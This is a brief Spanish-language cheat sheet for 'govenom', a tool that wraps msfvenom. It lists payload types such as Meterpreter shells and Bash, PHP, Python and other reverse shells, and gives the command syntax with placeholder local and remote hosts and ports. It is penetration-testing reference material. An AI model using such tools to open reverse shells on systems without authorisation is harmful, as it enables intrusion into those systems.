# Govenom Cheat Sheet

#### Generar payloads de msfvenom
```
govenom <PAYLOAD>
```

#### Payloads disponibles
```
asp      Generate a ASP Meterpreter shell
bash     Generate a Bash reverse shell
jsp      Generate a Jsp reverse shell
linux    Generate Linux Meterpreter reverse/bind shell x86 multi stage :)
macos    Generate MacOS Meterpreter reverse/bind shells :)
perl     Generate a Perl reverse shell
php      Generate PHP reverse shells
python   Generate a Python reverse shell
war      Generate a War reverse shell
windows  Generate Windows Meterpreter muti shells :)
```

#### Generar payloads de msfvenom con nuestras propias opciones
```
govenom <PAYLOAD> -lhost <IP-LOCAL> -lpor <PORT-LOCAL> -rhost <IP-REMOTE>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)